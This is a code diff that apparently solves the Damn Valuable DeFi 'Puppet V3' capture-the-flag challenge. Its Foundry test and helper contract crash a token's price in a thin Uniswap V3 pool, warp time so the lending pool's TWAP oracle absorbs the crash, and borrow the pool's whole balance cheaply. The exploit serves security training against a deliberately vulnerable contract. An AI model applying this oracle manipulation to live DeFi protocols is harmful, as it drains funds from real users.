@@ -5,6 +5,8 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
 import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
+import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
+import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
@@ -119,7 +121,28 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        // 1. Crash DVT's price by selling it directly into the real Uniswap V3 pool.
+        //    The LP position only covers a narrow band (ticks -60..60), so once we
+        //    push past it there's no liquidity left to resist further movement.
+        PuppetV3Swapper swapper = new PuppetV3Swapper(lendingPool.uniswapV3Pool(), token, weth);
+        token.transfer(address(swapper), PLAYER_INITIAL_TOKEN_BALANCE);
+        swapper.crash();
+
+        // 2. Warp forward, staying under the 115-second budget _isSolved() checks.
+        //    The crashed price only gets folded into the TWAP once time has passed
+        //    since the swap (the "now" edge of the 600s average moves with us,
+        //    weighting the crashed tick by elapsed-seconds / 600).
+        vm.warp(block.timestamp + 113);
+
+        // 3. Wrap ETH and borrow against the now heavily-discounted TWAP price
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log("deposit required (wei):", depositRequired);
+        weth.approve(address(lendingPool), depositRequired);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        // 4. Rescue the funds
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
@@ -133,5 +156,36 @@ contract PuppetV3Challenge is Test {
 
     function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
         return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
+    }
+}
+
+// Executes the crashing swap directly against the real Uniswap V3 pool.
+// A contract is required here (not an EOA) because the pool calls back
+// into the swap initiator via uniswapV3SwapCallback.
+contract PuppetV3Swapper is IUniswapV3SwapCallback {
+    IUniswapV3Pool public immutable pool;
+    DamnValuableToken public immutable token;
+    WETH public immutable weth;
+    bool public immutable dvtIsToken0;
+
+    constructor(IUniswapV3Pool _pool, DamnValuableToken _token, WETH _weth) {
+        pool = _pool;
+        token = _token;
+        weth = _weth;
+        dvtIsToken0 = address(_token) < address(_weth);
+    }
+
+    function crash() external {
+        uint256 dvtBalance = token.balanceOf(address(this));
+        uint160 limit = dvtIsToken0 ? (TickMath.MIN_SQRT_RATIO + 1) : (TickMath.MAX_SQRT_RATIO - 1);
+        pool.swap(address(this), dvtIsToken0, int256(dvtBalance), limit, "");
+    }
+
+    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
+        require(msg.sender == address(pool), "bad caller");
+        uint256 amountOwed = dvtIsToken0
+            ? (amount0Delta > 0 ? uint256(amount0Delta) : 0)
+            : (amount1Delta > 0 ? uint256(amount1Delta) : 0);
+        token.transfer(msg.sender, amountOwed);
     }
 }
